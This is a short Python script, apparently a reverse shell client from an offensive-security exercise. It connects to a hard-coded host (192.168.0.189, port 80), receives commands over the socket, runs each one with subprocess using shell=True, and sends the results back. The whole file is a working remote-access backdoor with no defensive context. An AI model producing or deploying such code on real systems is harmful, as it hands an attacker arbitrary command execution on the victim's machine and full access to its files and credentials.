import socket, subprocess

def execute_system_command(command):
    return subprocess.check_output(command,shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.0.189",80)) #change ip address to client

# connection.send("\n[+] Connection established.\n")

while True:
    command = connection.recv(1024)
    command_result = execute_system_command(command)
    connection.send(command_result.decode('utf-8'))

connection.close()